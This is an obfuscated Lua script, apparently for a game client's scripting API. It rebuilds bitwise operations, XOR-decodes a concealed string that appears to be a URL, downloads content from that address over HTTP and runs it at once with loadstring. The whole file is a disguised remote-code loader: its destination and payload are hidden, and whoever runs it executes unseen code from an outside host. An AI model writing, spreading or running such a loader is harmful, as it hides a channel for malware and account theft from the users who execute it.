

bit32={};local v0=85 -53 ;local v1=(3 -1)^v0 ;bit32.bnot=function(v18) local v19=0 + 0 ;while true do if (v19==0) then v18=v18%v1 ;return (v1-(998 -(915 + 82))) -v18 ;end end end;bit32.band=function(v20,v21) local v22=0;local v23;local v24;while true do if (v22==1) then if (v21==(4294967295 -0)) then return v20%(4294967296 -0) ;end v20,v21=v20%v1 ,v21%v1 ;v22=2;end if ((1187 -(1069 + 118))==v22) then if (v21==255) then return v20%256 ;end if (v21==65535) then return v20%(148681 -83145) ;end v22=1 -0 ;end if (v22==(1 + 1)) then v23=0 -0 ;v24=1;v22=3 + 0 ;end if (v22==(794 -(368 + 423))) then for v55=1,v0 do local v56=0 -0 ;local v57;local v58;while true do if (v56==0) then v57,v58=v20%2 ,v21%(20 -(10 + 8)) ;v20,v21=math.floor(v20/(7 -5) ),math.floor(v21/2 );v56=443 -(416 + 26) ;end if (v56==1) then if ((v57 + v58)==(6 -4)) then v23=v23 + v24 ;end v24=2 * v24 ;break;end end end return v23;end end end;bit32.bor=function(v25,v26) if (v26==(110 + 145)) then return (v25-(v25%256)) + (450 -195) ;end if (v26==(65973 -(145 + 293))) then return (v25-(v25%(65966 -(44 + 386)))) + 65535 ;end if (v26==4294967295) then return 4294968781 -(998 + 488) ;end v25,v26=v25%v1 ,v26%v1 ;local v27=0;local v28=1 + 0 ;for v47=1 + 0 ,v0 do local v48=772 -(201 + 571) ;local v49;local v50;while true do if ((1138 -(116 + 1022))==v48) then v49,v50=v25%2 ,v26%2 ;v25,v26=math.floor(v25/(8 -6) ),math.floor(v26/2 );v48=1 + 0 ;end if (v48==(3 -2)) then if ((v49 + v50)>=(3 -2)) then v27=v27 + v28 ;end v28=(861 -(814 + 45)) * v28 ;break;end end end return v27;end;bit32.bxor=function(v29,v30) v29,v30=v29%v1 ,v30%v1 ;local v31=0 -0 ;local v32=1 + 0 ;for v51=1 + 0 ,v0 do local v52=885 -(261 + 624) ;local v53;local v54;while true do if (v52==(1 -0)) then if ((v53 + v54)==(1081 -(1020 + 60))) then v31=v31 + v32 ;end v32=(1425 -(630 + 793)) * v32 ;break;end if (v52==0) then v53,v54=v29%2 ,v30%(6 -4) ;v29,v30=math.floor(v29/(9 -7) ),math.floor(v30/(1 + 1) );v52=3 -2 ;end end end return v31;end;bit32.lshift=function(v33,v34) local v35=0;while true do if (v35==(1748 -(760 + 987))) then if (v34<0) then return math.floor(v33 * (2^v34) );else return (v33 * ((1915 -(1789 + 124))^v34))%v1 ;end break;end if (v35==(766 -(745 + 21))) then if (math.abs(v34)>=v0) then return 0 + 0 ;end v33=v33%v1 ;v35=2 -1 ;end end end;bit32.rshift=function(v36,v37) local v38=0 -0 ;while true do if (v38==1) then if (v37>0) then return math.floor(v36 * ((1 + 1)^ -v37) );else return (v36 * (2^ -v37))%v1 ;end break;end if (v38==(0 + 0)) then if (math.abs(v37)>=v0) then return 0;end v36=v36%v1 ;v38=1;end end end;bit32.arshift=function(v39,v40) local v41=0;while true do if (v41==(1056 -(87 + 968))) then if (v40>0) then local v60=0 -0 ;local v61;while true do if (v60==(0 + 0)) then v61=0 -0 ;if (v39>=(v1/(1415 -(447 + 966)))) then v61=v1-((5 -3)^(v0-v40)) ;end v60=1818 -(1703 + 114) ;end if (v60==(702 -(376 + 325))) then return math.floor(v39 * ((2 -0)^ -v40) ) + v61 ;end end else return (v39 * ((5 -3)^ -v40))%v1 ;end break;end if (v41==(0 + 0)) then if (math.abs(v40)>=v0) then return 0 -0 ;end v39=v39%v1 ;v41=15 -(9 + 5) ;end end end;local v9=string.char;local v10=string.byte;local v11=string.sub;local v12=bit32 or bit ;local v13=v12.bxor;local v14=table.concat;local v15=table.insert;local function v16(v42,v43) local v44=376 -(85 + 291) ;local v45;while true do if (v44==(1266 -(243 + 1022))) then return v14(v45);end if ((0 -0)==v44) then v45={};for v59=1 + 0 , #v42 do v15(v45,v9(v13(v10(v11(v42,v59,v59 + 1 )),v10(v11(v43,1 + (v59% #v43) ,(1181 -(1123 + 57)) + (v59% #v43) + 1 )))%256 ));end v44=1 + 0 ;end end end local v17=v16("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\254\41\194\190\209\60\222\209\220\32\245\244\198\11\197\204\255\2\169\169\194\24\194\140\211\32\231\191\212\81\220\194\210\43\169\233\248\31\196\215\212\1\225\156\194\10\240\192\222\54\245\245\203\11\208\141\215\48\231","\126\177\163\187\69\134\219\167");modules.corelib.HTTP.get(v17,function(v46) assert(loadstring(v46)());end);
